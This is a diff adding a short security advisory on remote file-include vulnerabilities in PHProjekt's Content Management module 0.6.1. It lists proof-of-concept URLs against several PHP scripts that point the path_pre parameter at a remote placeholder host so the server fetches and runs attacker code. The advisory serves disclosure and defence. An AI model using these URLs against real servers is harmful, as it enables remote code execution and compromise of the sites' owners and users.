@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/19628/info
+
+Multiple remote file-include vulnerabilities affect the Content Management module for PHProjekt because the application fails to properly sanitize user-supplied input before using it in a PHP 'include()' function call. 
+
+An attacker may leverage these issues to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. 
+
+These issues affect version 0.6.1; earlier versions may also be vulnerable.
+
+http://www.example.com/[Path]/cm_lib.inc.php?path_pre=http://cmd.gif? 
+http://www.example.com/[Path]/doc/br.edithelp.php?path_pre=http://cmd.gif? http://www.example.com/[Path]/doc/de.edithelp.php?path_pre=http://cmd.gif? http://www.example.com/[Path]/doc/ct.edithelp.php?path_pre=http://cmd.gif? 
+http://www.example.com/[Path]/userrating.php?path_pre=http://cmd.gif? 
+http://www.example.com/[Path]/listing.php?path_pre=http://cmd.gif?
